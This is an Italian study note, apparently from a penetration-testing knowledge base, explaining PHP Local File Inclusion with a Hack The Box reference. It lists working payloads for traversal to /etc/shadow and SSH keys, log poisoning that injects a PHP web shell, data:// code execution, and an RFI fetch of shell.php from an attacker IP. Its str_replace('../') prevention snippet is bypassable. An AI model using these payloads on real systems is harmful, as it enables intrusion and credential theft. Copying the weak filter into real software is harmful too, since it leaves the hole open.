# LFI — Local File Inclusion

**Categoria:** #web #injection #exploitation  
**Linguaggio:** PHP  
**OWASP:** [[A03-2021 Injection]]  
**Relazioni:** [[RFI - Remote File Inclusion]] [[Path Traversal]]

---

## 📖 Cos'è

LFI è una vulnerabilità PHP che permette di far includere al server un file **locale** del filesystem tramite un parametro non sanitizzato. A differenza di [[RFI - Remote File Inclusion]], il file deve già esistere sul server.

---

## 🆚 LFI vs RFI vs Path Traversal

| Vulnerabilità  | Cosa fa                                           | Dove legge             |
| -------------- | ------------------------------------------------- | ---------------------- |
| Path Traversal | Legge file fuori dalla directory prevista         | Filesystem locale      |
| LFI            | Include ed esegue file locali tramite `include()` | Filesystem locale      |
| RFI            | Include ed esegue file remoti                     | Server dell'attaccante |

---

## 🔍 Come identificarlo

URL vulnerabile:

```
http://target.com/index.php?page=about.html
```

Codice PHP vulnerabile sottostante:

```php
<?php include($_GET['page']); ?>
```

---

## 💥 Exploitation

### Path Traversal base

```
# Linux
http://target.com/index.php?page=../../etc/passwd
http://target.com/index.php?page=../../etc/shadow

# Windows
http://target.com/index.php?page=../../windows/system32/drivers/etc/hosts
http://target.com/index.php?page=../../xampp/htdocs/config.php
```

### Quanti `../` servono?

Dipende da dove si trova il file PHP sul server. Se il path è `C:\xampp\htdocs\index.php`:

```
htdocs    → ../
xampp     → ../../
C:\       → ../../../
```

### File interessanti da leggere su Linux

```
/etc/passwd           → lista utenti
/etc/shadow           → hash password (richiede root)
/etc/hosts            → mapping hostname
/var/www/html/config.php  → credenziali DB
~/.ssh/id_rsa         → chiave privata SSH
/proc/self/environ    → variabili d'ambiente (può contenere credenziali)
```

### File interessanti su Windows

```
C:\windows\system32\drivers\etc\hosts
C:\xampp\htdocs\config.php
C:\Users\Administrator\Desktop\flag.txt
C:\inetpub\wwwroot\web.config
```

---

## 🔗 LFI → RCE

### Via log poisoning

```bash
# 1. Inietta codice PHP nei log del server
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Includi il log via LFI
http://target.com/index.php?page=../../var/log/apache2/access.log&cmd=whoami
```

### Via /proc/self/environ

```
http://target.com/index.php?page=../../proc/self/environ&cmd=whoami
```

### Via PHP wrappers

```
# Leggi il sorgente PHP in base64
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Esegui codice PHP
http://target.com/index.php?page=data://text/plain,<?php system('whoami');?>
```

---

## 🛡️ Come si previene

```php
// Whitelist dei file consentiti
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}

// Oppure rimuovi i path traversal dall'input
$page = str_replace('../', '', $_GET['page']);
```

---

## LFI vs RFI — differenza fondamentale

|                 | LFI                              | RFI                          |
| --------------- | -------------------------------- | ---------------------------- |
| Legge/carica da | Filesystem **locale** del server | Server **remoto** (tuo)      |
| Payload         | `../../etc/passwd`               | `http://TUO_IP/shell.php`    |
| Risultato       | Legge file sul server            | Esegue codice dal tuo server |
| Requisiti PHP   | Nessuno di speciale              | `allow_url_include = On`     |
| Pericolosità    | Alta                             | Altissima                    |

---

## Con un esempio visivo

**LFI:**

```
Tu                    Server vittima
 |                         |
 |-- ?page=../../etc/passwd|
 |                         |
 |<-- contenuto /etc/passwd|
```

Il server legge un file **suo**.

---

**RFI:**

```
Tu                    Server vittima
 |                         |
 |-- ?page=http://TUO_IP/shell.php
 |                         |
 |                  scarica shell.php
 |                  dal tuo server
 |                  ed ESEGUE il codice
 |<-- output del comando---|
```

Il server carica ed esegue un file **tuo**.

---

## Il caso [[UNC Path]] — è LFI o RFI?

È un caso ibrido — tecnicamente è **LFI** perché sfrutta la stessa vulnerabilità, ma il payload punta a un IP esterno come RFI. La differenza è che non stai facendo eseguire codice — stai solo triggherando un'autenticazione SMB. Per questo si classifica come LFI. 🙂

---
## 📚 Lezioni apprese

- Ogni parametro `page=`, `file=`, `template=` è un potenziale vettore LFI
- L'errore PHP rivela il path assoluto del file → utile per calcolare i `../`
- LFI su Windows usa `\` ma PHP accetta anche `/` come separatore
- LFI può escalare a RCE tramite log poisoning o PHP wrappers
- Su HTB-Responder l'LFI era il punto di partenza, non il punto di arrivo

---

## 🔗 Riferimenti

- [[RFI — Remote File Inclusion]]
- [[A03-2021 Injection]]
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [[LFI/RFI - vulnerable parameters]]

---

## Tags

#lfi #local-file-inclusion #php #path-traversal #web #injection #rce #log-poisoning #windows #linux